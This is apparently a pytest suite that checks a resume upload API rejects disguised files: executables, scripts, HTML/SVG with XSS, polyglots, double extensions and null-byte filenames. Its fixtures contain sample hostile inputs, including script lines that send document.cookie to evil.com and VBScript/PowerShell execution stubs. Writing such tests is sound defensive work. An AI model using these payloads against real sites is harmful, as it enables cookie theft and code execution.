"""
Integration tests for file spoofing attack detection and prevention.

This test suite validates the security measures against file spoofing attacks:
- Executable files disguised as documents (EXE renamed to PDF)
- Script files with document extensions (.js, .vbs renamed to .pdf/.docx)
- HTML files with malicious scripts disguised as documents
- Polyglot files (valid in multiple formats)
- Double extension attacks (.pdf.exe, .docx.js)
- MIME type header spoofing
- Content-Disposition header manipulation

Test Coverage:
- EXE files rejected regardless of extension
- Script content rejected even with valid document extensions
- HTML/JavaScript injection files rejected
- Polyglot files handled safely
- Double extension attacks prevented
- MIME type spoofing detected via magic number validation
- Complete spoofing attack workflow simulation
"""
import io
from pathlib import Path
from typing import Generator

import pytest
from fastapi.testclient import TestClient

# Import the FastAPI application
import sys
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from main import app


@pytest.fixture
def valid_pdf_file() -> bytes:
    """
    Create a minimal valid PDF file for testing.

    Returns:
        Bytes content of a simple PDF file with correct magic number
    """
    pdf_content = b"""%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/Resources <<
/Font <<
/F1 4 0 R
>>
>>
/MediaBox [0 0 612 792]
/Contents 5 0 R
>>
endobj
4 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>
endobj
5 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
50 700 Td
(Test Resume Content) Tj
ET
endstream
endobj
xref
0 6
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000264 00000 n
0000000349 00000 n
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
428
%%EOF
"""
    return pdf_content


@pytest.fixture
def exe_file_disguised_as_pdf() -> bytes:
    """
    Create a Windows executable file (PE format) disguised as PDF.

    This simulates an attacker renaming malware.exe to malware.pdf
    to bypass extension-based filters.

    Returns:
        Bytes content of a PE executable with MZ header
    """
    # PE (Portable Executable) file header starts with "MZ"
    # This is a minimal PE header that would execute on Windows
    exe_content = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
    exe_content += b"\xb8\x00\x00\x00\x00" + b"\x00" * 200
    return exe_content


@pytest.fixture
def javascript_file_disguised_as_pdf() -> bytes:
    """
    Create a JavaScript file disguised as PDF.

    This simulates an attacker renaming malicious.js to resume.pdf
    to inject scripts into the system.

    Returns:
        Bytes content of JavaScript code
    """
    js_content = b"""// Malicious JavaScript code
(function() {
    var payload = "malicious_code_here";
    eval(payload);
    document.cookie = "stolen=true";
})();
"""
    return js_content


@pytest.fixture
def html_file_disguised_as_docx() -> bytes:
    """
    Create an HTML file with malicious scripts disguised as DOCX.

    This simulates an HTML file with XSS payloads renamed to .docx.

    Returns:
        Bytes content of HTML with script tags
    """
    html_content = b"""<html>
<head><title>Malicious Resume</title></head>
<body>
<script>
    // Steal session token
    fetch('http://evil.com/steal?cookie=' + document.cookie);
</script>
<h1>Resume Content</h1>
</body>
</html>
"""
    return html_content


@pytest.fixture
def vbscript_file_disguised_as_pdf() -> bytes:
    """
    Create a VBScript file disguised as PDF.

    VBScript can execute malicious code on Windows systems.

    Returns:
        Bytes content of VBScript code
    """
    vbs_content = b"""' Malicious VBScript
Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run "malicious_command.exe"
"""
    return vbs_content


@pytest.fixture
def powershell_file_disguised_as_docx() -> bytes:
    """
    Create a PowerShell script file disguised as DOCX.

    PowerShell is commonly used in post-exploitation.

    Returns:
        Bytes content of PowerShell script
    """
    ps_content = b"""# Malicious PowerShell
Invoke-Expression "malicious_command"
Start-Process "evil.exe" -ArgumentList "/silent"
"""
    return ps_content


@pytest.fixture
def polyglot_pdf_zip() -> bytes:
    """
    Create a polyglot file that is both a valid PDF and ZIP archive.

    Polyglot files can bypass filters and execute in multiple contexts.

    Returns:
        Bytes content of a PDF/ZIP polyglot
    """
    # Start with PDF magic number
    polyglot = b"%PDF-1.4\n"
    # Add some PDF content
    polyglot += b"1 0 obj<<>>endobj\n"
    # Add ZIP signature (PK\x03\x04) which might be parsed by ZIP handlers
    polyglot += b"PK\x03\x04"
    polyglot += b"Extra content" * 50
    polyglot += b"%%EOF"
    return polyglot


@pytest.fixture
def double_extension_file() -> tuple:
    """
    Create a file with double extension for testing.

    Returns:
        Tuple of (filename, content)
    """
    # EXE content with double extension
    exe_content = b"MZ\x90\x00" + b"\x00" * 100
    return ("resume.pdf.exe", exe_content)


@pytest.fixture
def null_byte_in_extension() -> tuple:
    """
    Create a filename with null byte to bypass extension checks.

    Some systems truncate at null bytes, allowing .pdf\x00.exe
    to be seen as .pdf while being .exe to other handlers.

    Returns:
        Tuple of (filename, content)
    """
    exe_content = b"MZ\x90\x00" + b"\x00" * 100
    return ("resume.pdf\x00.exe", exe_content)


@pytest.fixture
def client() -> Generator[TestClient, None, None]:
    """
    Create a FastAPI test client for all tests.

    Yields:
        TestClient instance
    """
    from fastapi.testclient import TestClient
    from main import app

    with TestClient(app) as test_client:
        yield test_client


class TestExecutableDisguisedAsDocument:
    """Tests for executable files disguised as documents."""

    def test_exe_renamed_as_pdf_rejected(self, client: TestClient, exe_file_disguised_as_pdf: bytes):
        """Test that an EXE file renamed to PDF is rejected."""
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("malware.pdf", io.BytesIO(exe_file_disguised_as_pdf), "application/pdf")}
        )

        assert response.status_code == 415
        data = response.json()
        assert "detail" in data
        assert "magic number" in data["detail"].lower() or "file header" in data["detail"].lower() or "invalid" in data["detail"].lower()

    def test_exe_renamed_as_docx_rejected(self, client: TestClient, exe_file_disguised_as_pdf: bytes):
        """Test that an EXE file renamed to DOCX is rejected."""
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("document.docx", io.BytesIO(exe_file_disguised_as_pdf), "application/vnd.openxmlformats-officedocument.wordprocessingml.document")}
        )

        assert response.status_code == 415
        data = response.json()
        assert "detail" in data

    def test_elf_binary_disguised_as_pdf_rejected(self, client: TestClient):
        """Test that an ELF binary (Linux executable) renamed to PDF is rejected."""
        # ELF magic number: 0x7F 'E' 'L' 'F'
        elf_content = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 100
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("linux.pdf", io.BytesIO(elf_content), "application/pdf")}
        )

        assert response.status_code == 415
        data = response.json()
        assert "detail" in data

    def test_mach_o_binary_disguised_as_pdf_rejected(self, client: TestClient):
        """Test that a Mach-O binary (macOS executable) renamed to PDF is rejected."""
        # Mach-O magic number for 64-bit: 0xFEEDFACE or 0xFEEDFACF
        macho_content = b"\xcf\xfa\xed\xfe" + b"\x00" * 100
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("macos.pdf", io.BytesIO(macho_content), "application/pdf")}
        )

        assert response.status_code == 415
        data = response.json()
        assert "detail" in data


class TestScriptFilesDisguisedAsDocuments:
    """Tests for script files disguised as documents."""

    def test_javascript_renamed_as_pdf_rejected(self, client: TestClient, javascript_file_disguised_as_pdf: bytes):
        """Test that JavaScript file renamed to PDF is rejected."""
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("resume.pdf", io.BytesIO(javascript_file_disguised_as_pdf), "application/pdf")}
        )

        assert response.status_code == 415
        data = response.json()
        assert "detail" in data

    def test_vbscript_renamed_as_pdf_rejected(self, client: TestClient, vbscript_file_disguised_as_pdf: bytes):
        """Test that VBScript file renamed to PDF is rejected."""
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("resume.pdf", io.BytesIO(vbscript_file_disguised_as_pdf), "application/pdf")}
        )

        assert response.status_code == 415
        data = response.json()
        assert "detail" in data

    def test_powershell_renamed_as_docx_rejected(self, client: TestClient, powershell_file_disguised_as_docx: bytes):
        """Test that PowerShell script renamed to DOCX is rejected."""
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("resume.docx", io.BytesIO(powershell_file_disguised_as_docx), "application/vnd.openxmlformats-officedocument.wordprocessingml.document")}
        )

        assert response.status_code == 415
        data = response.json()
        assert "detail" in data

    def test_python_script_renamed_as_pdf_rejected(self, client: TestClient):
        """Test that Python script renamed to PDF is rejected."""
        python_content = b"#!/usr/bin/env python\nimport os\nos.system('malicious')"
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("script.pdf", io.BytesIO(python_content), "application/pdf")}
        )

        assert response.status_code == 415
        data = response.json()
        assert "detail" in data

    def test_shell_script_renamed_as_pdf_rejected(self, client: TestClient):
        """Test that shell script renamed to PDF is rejected."""
        shell_content = b"#!/bin/bash\necho 'malicious command' | bash"
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("script.pdf", io.BytesIO(shell_content), "application/pdf")}
        )

        assert response.status_code == 415
        data = response.json()
        assert "detail" in data


class TestHTMLInjectionFiles:
    """Tests for HTML files with malicious content disguised as documents."""

    def test_html_with_script_renamed_as_pdf_rejected(self, client: TestClient, html_file_disguised_as_docx: bytes):
        """Test that HTML file with malicious scripts renamed to DOCX is rejected."""
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("resume.docx", io.BytesIO(html_file_disguised_as_docx), "application/vnd.openxmlformats-officedocument.wordprocessingml.document")}
        )

        assert response.status_code == 415
        data = response.json()
        assert "detail" in data

    def test_html_with_xss_renamed_as_docx_rejected(self, client: TestClient):
        """Test that HTML with XSS payload renamed to DOCX is rejected."""
        xss_html = b"""<html><body>
<img src=x onerror="alert('XSS')">
<script>fetch('http://evil.com/steal?c='+document.cookie)</script>
</body></html>"""
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("xss.docx", io.BytesIO(xss_html), "application/vnd.openxmlformats-officedocument.wordprocessingml.document")}
        )

        assert response.status_code == 415
        data = response.json()
        assert "detail" in data

    def test_svg_with_javascript_renamed_as_pdf_rejected(self, client: TestClient):
        """Test that SVG file with JavaScript renamed to PDF is rejected."""
        svg_content = b"""<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert('XSS')</script>
<circle cx="100" cy="100" r="50"/>
</svg>"""
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("image.svg.pdf", io.BytesIO(svg_content), "application/pdf")}
        )

        assert response.status_code == 415
        data = response.json()
        assert "detail" in data


class TestPolyglotFiles:
    """Tests for polyglot files (valid in multiple formats)."""

    def test_pdf_zip_polyglot_handled_safely(self, client: TestClient, polyglot_pdf_zip: bytes):
        """
        Test that PDF/ZIP polyglot files are handled safely.

        The system should validate based on the primary content type
        and reject suspicious combinations.
        """
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("polyglot.pdf", io.BytesIO(polyglot_pdf_zip), "application/pdf")}
        )

        # Should either accept as PDF or reject as suspicious
        # Most importantly, it should NOT crash or cause unexpected behavior
        assert response.status_code in [201, 415, 400]

    def test_gif_arbitrary_polyglot_rejected(self, client: TestClient):
        """Test that GIF files with arbitrary content are rejected as documents."""
        # GIF magic number
        gif_content = b"GIF89a" + b"\x00" * 100
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("image.gif.pdf", io.BytesIO(gif_content), "application/pdf")}
        )

        assert response.status_code == 415
        data = response.json()
        assert "detail" in data


class TestDoubleExtensionAttacks:
    """Tests for double extension attack vectors."""

    def test_double_extension_pdf_exe_rejected(self, client: TestClient, double_extension_file: tuple):
        """Test that files with double extensions (.pdf.exe) are rejected."""
        filename, content = double_extension_file
        response = client.post(
            "/api/resumes/upload",
            files={"file": (filename, io.BytesIO(content), "application/pdf")}
        )

        # Magic number validation should catch this
        assert response.status_code == 415
        data = response.json()
        assert "detail" in data

    def test_double_extension_docx_js_rejected(self, client: TestClient):
        """Test that .docx.js files are rejected."""
        js_content = b"alert('xss');"
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("resume.docx.js", io.BytesIO(js_content), "application/javascript")}
        )

        assert response.status_code in [415, 400]
        data = response.json()
        assert "detail" in data


class TestNullByteInjection:
    """Tests for null byte injection in filenames."""

    def test_null_byte_in_filename_handled(self, client: TestClient, null_byte_in_extension: tuple):
        """
        Test that filenames with null bytes are handled securely.

        Null bytes can be used to bypass extension checks in some systems.
        """
        filename, content = null_byte_in_extension
        response = client.post(
            "/api/resumes/upload",
            files={"file": (filename, io.BytesIO(content), "application/pdf")}
        )

        # Should be rejected due to magic number mismatch
        assert response.status_code == 415
        data = response.json()
        assert "detail" in data


class TestMIMESpoofing:
    """Tests for MIME type header spoofing attacks."""

    def test_mime_spoofing_exe_as_pdf_detected(self, client: TestClient, exe_file_disguised_as_pdf: bytes):
        """
        Test that MIME type spoofing is detected via magic number validation.

        Even if the Content-Type header says application/pdf,
        the magic number validation should detect the actual file type.
        """
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("spoofed.pdf", io.BytesIO(exe_file_disguised_as_pdf), "application/pdf")}
        )

        assert response.status_code == 415
        data = response.json()
        assert "detail" in data

    def test_correct_mime_with_wrong_content_rejected(self, client: TestClient, javascript_file_disguised_as_pdf: bytes):
        """Test that correct MIME type doesn't bypass magic number validation."""
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("wrong.pdf", io.BytesIO(javascript_file_disguised_as_pdf), "application/pdf")}
        )

        assert response.status_code == 415
        data = response.json()
        assert "detail" in data


class TestAdvancedSpoofingTechniques:
    """Tests for advanced file spoofing techniques."""

    def test_binary_template_injection_rejected(self, client: TestClient):
        """Test that Office template files with macros are rejected."""
        # MS Office template magic number (DOT/DOTX)
        template_content = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 200
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("macro.dot", io.BytesIO(template_content), "application/msword")}
        )

        # Should be rejected as not a standard document type
        assert response.status_code == 415

    def test_rtf_with_exploits_rejected(self, client: TestClient):
        """Test that RTF files with potential exploits are handled."""
        rtf_content = b"{\\rtf1\\ansi\\ansicpg1252\\deff0"
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("exploit.rtf", io.BytesIO(rtf_content), "application/rtf")}
        )

        # RTF is not in the allowed file types
        assert response.status_code == 415

    def test_chm_help_file_rejected(self, client: TestClient):
        """Test that CHM (Compiled HTML Help) files are rejected."""
        # CHM files can contain malicious code
        chm_content = b"ITSF" + b"\x00" * 100
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("help.chm", io.BytesIO(chm_content), "application/pdf")}
        )

        assert response.status_code == 415

    def test_jar_archive_rejected(self, client: TestClient):
        """Test that JAR files (Java archives) are rejected as documents."""
        # JAR files are ZIP archives with specific structure
        jar_content = b"PK\x03\x04" + b"META-INF/" + b"\x00" * 100
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("applet.jar", io.BytesIO(jar_content), "application/pdf")}
        )

        # While ZIP-based, should be rejected as not a valid DOCX
        assert response.status_code == 415


class TestEdgeCases:
    """Tests for edge cases and boundary conditions."""

    def test_text_file_claiming_pdf_rejected(self, client: TestClient):
        """Test that plain text files claiming to be PDF are rejected."""
        text_content = b"This is just a text file, not a PDF at all."
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("fake.pdf", io.BytesIO(text_content), "application/pdf")}
        )

        assert response.status_code == 415

    def test_random_bytes_with_extension_rejected(self, client: TestClient):
        """Test that random bytes with document extension are rejected."""
        random_content = b"\xff\xfe\xfd\xfc" * 50
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("random.pdf", io.BytesIO(random_content), "application/pdf")}
        )

        assert response.status_code == 415

    def test_valid_file_but_wrong_extension_rejected(self, client: TestClient, valid_pdf_file: bytes):
        """Test that valid PDF with .exe extension is rejected."""
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("document.exe", io.BytesIO(valid_pdf_file), "application/octet-stream")}
        )

        # Should reject due to file extension mismatch
        assert response.status_code == 415


class TestCompleteSpoofingAttackWorkflow:
    """Tests for complete spoofing attack scenarios."""

    def test_complete_spoofing_attack_blocked(self, client: TestClient, exe_file_disguised_as_pdf: bytes):
        """
        Test a complete file spoofing attack scenario.

        This simulates a sophisticated attacker attempting to upload malware:
        1. Renames malware.exe to resume.pdf
        2. Sets correct Content-Type header (application/pdf)
        3. Attempts to upload

        Expected: The attack is blocked at magic number validation.
        """
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("resume.pdf", io.BytesIO(exe_file_disguised_as_pdf), "application/pdf")}
        )

        # Attack should be blocked
        assert response.status_code == 415
        data = response.json()
        assert "detail" in data

        # Verify no file was created or record stored
        assert "id" not in data or data.get("id") is None

    def test_legitimate_file_accepted(self, client: TestClient, valid_pdf_file: bytes):
        """
        Test that legitimate files are still accepted.

        This ensures security measures don't block legitimate uploads.
        """
        response = client.post(
            "/api/resumes/upload",
            files={"file": ("legitimate_resume.pdf", io.BytesIO(valid_pdf_file), "application/pdf")}
        )

        # Legitimate file should be accepted
        assert response.status_code == 201
        data = response.json()
        assert "id" in data
        assert data["filename"] == "legitimate_resume.pdf"
        assert data["status"] == "pending"


# Cleanup fixture
@pytest.fixture(autouse=True)
def cleanup_uploaded_files():
    """
    Clean up uploaded test files after each test.

    This fixture runs automatically after each test to remove
    any files uploaded during the test.
    """
    yield

    # Cleanup: Remove files from uploads directory
    upload_dir = Path("backend/data/uploads")
    if upload_dir.exists():
        for file in upload_dir.glob("*"):
            if file.is_file():
                try:
                    file.unlink()
                except Exception:
                    pass


# Configuration for pytest
def pytest_configure(config):
    """Configure pytest markers."""
    config.addinivalue_line("markers", "slow: marks tests as slow (deselect with '-m \"not slow\"')")
    config.addinivalue_line("markers", "integration: marks tests as integration tests")
    config.addinivalue_line("markers", "security: marks tests as security tests")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])
